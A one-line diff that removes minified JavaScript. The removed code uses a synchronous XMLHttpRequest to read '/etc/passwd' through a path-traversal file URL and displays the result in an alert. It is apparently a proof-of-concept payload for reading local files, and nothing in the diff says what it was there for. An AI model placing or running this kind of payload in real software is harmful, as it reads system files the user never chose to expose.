@@ -1,1 +1,0 @@
-function readTextFile(e){var t=new XMLHttpRequest;t.open("GET",e,!1),t.onreadystatechange=function(){if(4===t.readyState&&(200===t.status||0==t.status)){var e=t.responseText;alert(e)}},t.send(null)}readTextFile("file:///../../../../../etc/passwd");
